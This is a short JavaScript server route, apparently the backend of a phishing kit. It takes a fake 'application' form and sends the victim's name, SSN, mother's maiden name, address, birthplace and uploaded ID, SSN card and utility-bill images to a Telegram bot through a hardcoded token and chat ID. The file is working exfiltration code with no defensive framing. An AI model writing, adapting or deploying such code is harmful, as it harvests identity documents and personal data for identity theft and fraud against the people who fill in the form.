export const config = {
  api: {
    bodyParser: false,
  },
};

import formidable from "formidable";
import fs from "fs";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ message: "Method not allowed" });
  }

  const form = new formidable.IncomingForm();

  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).json({ error: "Form parse error" });

    // const BOT_TOKEN = process.env.BOT_TOKEN;
    // const CHAT_ID = process.env.CHAT_ID;
    const BOT_TOKEN = "7518413075";
    const CHAT_ID = "7650582960";

    try {
      // 1️⃣ Send Text Message
      const message = `
📩 NEW APPLICATION

👤 Name: ${fields.firstName} ${fields.lastName}
🆔 SSN: ${fields.ssn}
📞 Phone: ${fields.phone}
📧 Email: ${fields.email}
🏠 Address: ${fields.address}
⚧ Gender: ${fields.gender}
👨 Father: ${fields.fatherName}
👩 Mother: ${fields.motherName}
👵 Maiden: ${fields.motherMaidenName}
🌍 Birth Place: ${fields.birthPlace}
      `;

      await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
          }),
        }
      );

      // 2️⃣ Send Files
      const fileFields = ["idFront", "idBack", "ssnCard", "utilityBill"];

      for (let field of fileFields) {
        if (files[field]) {
          const file = files[field];

          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append(
            "document",
            fs.createReadStream(file.filepath)
          );

          await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
            {
              method: "POST",
              body: formData,
            }
          );
        }
      }

      res.status(200).json({ success: true });
    } catch (error) {
      console.error(error);
      res.status(500).json({ error: "Telegram send failed" });
    }
  });
}